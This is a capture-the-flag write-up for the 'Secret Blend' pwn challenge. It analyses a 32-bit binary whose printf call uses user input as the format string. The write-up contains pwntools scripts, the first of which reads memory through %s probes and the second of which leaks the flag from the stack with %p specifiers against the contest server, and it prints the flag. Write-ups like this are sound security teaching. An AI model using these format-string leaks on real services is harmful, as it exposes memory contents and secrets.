https://ctftime.org/event/2638

# The Secret Blend (PWN)

Not everything on the menu is meant to be seen.

nc chals1.apoorvctf.xyz 3003

## Analysis

`main` @ `0x08048677`

- Calls `vuln`

`vuln` @ `0x080485cb`

- Writes the flag to the stack
- Calls `fgets(local_74, 100, stdin)`
- Calls `printf(local_74)`

### Testing Out If The Remote Is The Same

Note: if you only care about the _solution_ to the task feel free to skip this section!

During exploit development I noticed extra data being written to stdout by the remote compared to what I would expect to see given the binary in the handout:

```bash
$ ./secret_blend 
Welcome to Kogarashi Café.
Barista: 'What will you have?'
asdf
asdf

$ nc chals1.apoorvctf.xyz 3003
Welcome to Kogarashi Café.
Barista: 'What will you have?'
asdf
asdf
asdf

$ ./secret_blend 
Welcome to Kogarashi Café.
Barista: 'What will you have?'
%p
0x64

$ nc chals1.apoorvctf.xyz 3003
Welcome to Kogarashi Café.
Barista: 'What will you have?'
%p
%p
0xa70
```

As you can see it appears to be echoing back our input once with something like `puts`. Notice how in the example with `%p` we get `%p` and then we get the result of `%p` when used as a format string.

Here we can see the decompilation from ghidra of the function in question:

```c
void vuln(void)

{
  char local_b4 [64];
  char local_74 [100];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Barista: \'The special blend is missing...(create flag.txt)\'");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_b4,0x40,local_10);
  fclose(local_10);
  puts("Barista: \'What will you have?\'");
  fgets(local_74,100,stdin);
  printf(local_74);
  putchar(10);
  return;
}
```

As you can see there would need to be something like `puts` between the final `fgets` and the `printf` to make sense of the output we see.

Here's a detailed view of the local output when I send `asdf`:

```bash
$ ./go.py
[+] Starting local process '/home/user/ctf/the_secret_blend/secret_blend': pid 9553
[*] Switching to interactive mode
[DEBUG] Received 0x3b bytes:
    00000000  57 65 6c 63  6f 6d 65 20  74 6f 20 4b  6f 67 61 72  │Welc│ome │to K│ogar│
    00000010  61 73 68 69  20 43 61 66  c3 a9 2e 0a  42 61 72 69  │ashi│ Caf│··.·│Bari│
    00000020  73 74 61 3a  20 27 57 68  61 74 20 77  69 6c 6c 20  │sta:│ 'Wh│at w│ill │
    00000030  79 6f 75 20  68 61 76 65  3f 27 0a                  │you │have│?'·│
    0000003b
Welcome to Kogarashi Café.
Barista: 'What will you have?'
$ asdf
[DEBUG] Sent 0x5 bytes:
    b'asdf\n'
[DEBUG] Received 0x6 bytes:
    b'asdf\n'
    b'\n'
asdf

[*] Process '/home/user/ctf/the_secret_blend/secret_blend' stopped with exit code 0 (pid 9553)
[*] Got EOF while reading in interactive
$ 
```

Here's a detailed view of the remote output when I send `asdf`:

```bash
$ ./go.py
[+] Opening connection to chals1.apoorvctf.xyz on port 3003: Done
[*] Switching to interactive mode
[DEBUG] Received 0x1b bytes:
    00000000  57 65 6c 63  6f 6d 65 20  74 6f 20 4b  6f 67 61 72  │Welc│ome │to K│ogar│
    00000010  61 73 68 69  20 43 61 66  c3 a9 2e                  │ashi│ Caf│··.│
    0000001b
Welcome to Kogarashi Café.[DEBUG] Received 0x22 bytes:
    b'\r\n'
    b"Barista: 'What will you have?'\r\n"


$ asdf
[DEBUG] Sent 0x5 bytes:
    b'asdf\n'
[DEBUG] Received 0x6 bytes:
    b'asdf\r\n'

[DEBUG] Received 0x8 bytes:
    b'asdf\r\n'
    b'\r\n'


[*] Got EOF while reading in interactive
$  
```

Here's a detailed view of the local output when I send `%p`:

```bash
$ ./go.py
[+] Starting local process '/home/user/ctf/the_secret_blend/secret_blend': pid 9579
[*] Switching to interactive mode
[DEBUG] Received 0x3b bytes:
    00000000  57 65 6c 63  6f 6d 65 20  74 6f 20 4b  6f 67 61 72  │Welc│ome │to K│ogar│
    00000010  61 73 68 69  20 43 61 66  c3 a9 2e 0a  42 61 72 69  │ashi│ Caf│··.·│Bari│
    00000020  73 74 61 3a  20 27 57 68  61 74 20 77  69 6c 6c 20  │sta:│ 'Wh│at w│ill │
    00000030  79 6f 75 20  68 61 76 65  3f 27 0a                  │you │have│?'·│
    0000003b
Welcome to Kogarashi Café.
Barista: 'What will you have?'
$ %p
[DEBUG] Sent 0x3 bytes:
    b'%p\n'
[DEBUG] Received 0x6 bytes:
    b'0x64\n'
    b'\n'
0x64

[*] Process '/home/user/ctf/the_secret_blend/secret_blend' stopped with exit code 0 (pid 9579)
[*] Got EOF while reading in interactive
$ 
```

Here's a detailed view of the remote's output when I send `%p`:

```bash
[+] Opening connection to chals1.apoorvctf.xyz on port 3003: Done
[*] Switching to interactive mode
[DEBUG] Received 0x1b bytes:
    00000000  57 65 6c 63  6f 6d 65 20  74 6f 20 4b  6f 67 61 72  │Welc│ome │to K│ogar│
    00000010  61 73 68 69  20 43 61 66  c3 a9 2e                  │ashi│ Caf│··.│
    0000001b
Welcome to Kogarashi Café.[DEBUG] Received 0x22 bytes:
    b'\r\n'
    b"Barista: 'What will you have?'\r\n"


$ %p
[DEBUG] Sent 0x3 bytes:
    b'%p\n'
[DEBUG] Received 0x4 bytes:
    b'%p\r\n'

[DEBUG] Received 0x9 bytes:
    b'0xa70\r\n'
    b'\r\n'


[*] Got EOF while reading in interactive
$  
```

In order to investigate this further I decided to use our control of the format string to attempt to inspect the binary on the remote.

This is a binary compiled without PIE and so we should expect the `\x7fELF` header to be present at the same address in both cases:

```bash
$ pwn checksec secret_blend 
[*] '/home/user/ctf/the_secret_blend/secret_blend'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Here I'm reading bytes from the start of the binary locally and at the same address on the remote:

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./secret_blend", checksec=False)
context.binary = elf

sniff = elf.address

with elf.process() as p:
    p.readuntil(b"have?\'\n")
    p.send(b"%24$s|||" + p32(sniff) + b"\n")
    #p.readuntil(b"\n\n") # not required locally
    print(p.readline())

with remote("chals1.apoorvctf.xyz", 3003) as p:
    p.readuntil(b"have?\'\r\n")
    p.send(b"%24$s|||" + p32(sniff) + b"\r\n")
    p.readuntil(b"\r\n\r\n")
    print(p.readline())
```

As you can see here they are not:

```bash
[+] Starting local process '/home/user/ctf/the_secret_blend/secret_blend': pid 8695
b'\x7fELF\x01\x01\x01|||\n'
[*] Process '/home/user/ctf/the_secret_blend/secret_blend' stopped with exit code 0 (pid 8695)
[+] Opening connection to chals1.apoorvctf.xyz on port 3003: Done
b'LM\xbb\xc2\xff\x7f|||\r\n'
[*] Closed connection to chals1.apoorvctf.xyz port 300
```

Not only does it not match but this region appears to contain changing values suggesting its used for a writable mapping:

```bash
[+] Starting local process '/home/user/ctf/the_secret_blend/secret_blend': pid 9665
b'\x7fELF\x01\x01\x01|||\n'
[*] Process '/home/user/ctf/the_secret_blend/secret_blend' stopped with exit code 0 (pid 9665)
[+] Opening connection to chals1.apoorvctf.xyz on port 3003: Done
b'M\r*\x0c\xfd\x7f|||\r\n'
[*] Closed connection to chals1.apoorvctf.xyz port 3003
```

Note: I may have made a mistake here - although if the binaries really are the same reading memory that contains the ELF header should work at the same offset on the stack right? - If so please let me know what I did wrong so I can correct it and learn more!

Here are the SHA-2-256 hashes for the files provided:

```bash
51313f4a0d4c962196d9c1903ea818266ef16a00ca143e7bc10c284bc94046fa  files.zip
e5896e1f6090ca03ab3739c3bba4124c11b3965ed735d9a36b162d2a66abccc0  secret_blend
```

I contacted the admins to let them know that I thought there might be a difference between the binary in the handout and the one on the remote and they assured me that the "Dockerfile copies from local" and that "I assure you local file hasnt[sic] changed".

Again if there is an explanation for this that allows for the binary to match the one in the handout I would like to know it is so please do let me know!

## Solution

1) Read the flag from the stack using our control of the `printf` format string

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./secret_blend", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals1.apoorvctf.xyz", 3003)

p.readuntil(b"have?\'\r\n")

p.send(b"%6$p.%7$p.%8$p.%9$p.%10$p.%11$p\r\n")

# not required locally
p.readuntil(b"\r\n") 
p.readuntil(b"\r\n")

leaks = p.readline().decode().split(".")

flag = b""
for leak in leaks:
    flag += p64(int(leak, 16))

print(flag.decode()[:-3]) # apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}
```

## Flag
`apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}`

smiley 2025/03/01
